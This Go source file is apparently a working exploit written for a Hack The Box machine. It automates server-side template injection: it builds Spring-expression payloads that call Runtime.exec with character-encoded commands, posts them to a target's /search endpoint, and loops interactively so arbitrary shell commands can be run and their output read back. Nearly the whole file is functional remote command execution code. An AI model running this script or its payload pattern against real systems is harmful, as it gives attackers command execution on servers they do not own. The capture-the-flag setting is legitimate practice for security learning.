/* 
This is a script to automate an SSTI vulnerability found in an active HTB machine
For now I will have to omit the name of the machine so I don't break the HTB ToS
Once the machine is retired I can publish the full name of the machine.
The output could be cleaned up a bit more with regex but this does the job just fine
Twitter: @yamsbot

Usage: $ go run sstiExploit.go
       $ enter IP address: <ip address>
       $ enter your command: <linux command>
       CTRL + C to exit program
*/
package main

import (
	"bufio"
	"fmt"
	"os"
	"net/http"
	"net/url"
	"io/ioutil"
	"log"
	"strings"
	"regexp"
)

func main(){
	// Request site IP Address and trim newline
	fmt.Printf("enter IP address: ")
	reader := bufio.NewReader(os.Stdin)
	ipAddress, _ := reader.ReadString('\n')
	fmt.Printf("ip address: %v", ipAddress)
	ipAddress = strings.TrimSuffix(ipAddress, "\n")
	// For loop to run multiple commands without having to restart program
	for i := 0; i < 1000000; i++ {
		fmt.Printf("enter your command: ")
		reader1 := bufio.NewReader(os.Stdin)
		command, _ := reader1.ReadString('\n')
		command1 := cnvrt(command)
		length := len(command1)
		payload := payloadGen(length, command1)
		sendReq(ipAddress, payload)
	}
}

func payloadGen(length int, command []rune) string {
	payload := fmt.Sprintf("*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%v)", command[0])
	for i := 1; i < length; i++ {
		payload += fmt.Sprintf(".concat(T(java.lang.Character).toString(%v))", command[i])	
	}
	payload += ").getInputStream())}"
	return payload
}

func cnvrt(command string) []rune {
	r := []rune(command)
	if len(r) > 0 {
		r = r[:len(r) -1 ]
	}
	return r
}

func sendReq(ipAddress string, payload string) {
	// Create and send HTTP request
	params := url.Values{}
	params.Add("name", payload)
	urlV := fmt.Sprintf("http://%v/search", ipAddress)
	resp, err := http.PostForm(urlV, params)
	if err != nil {
	log.Printf("request failed lol: %s", err)
	return
	}
	defer resp.Body.Close()
	// Read response and regex for the data we want
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("there was an error >_>: %s", err)
	}
	parseResponse, _ := regexp.Compile(`\<h2 class\=\"searched\"\>[\d\D]*\<\/h2\>`)
	response := fmt.Sprintf(parseResponse.FindString(string(body)))
	fmt.Println(response)
}
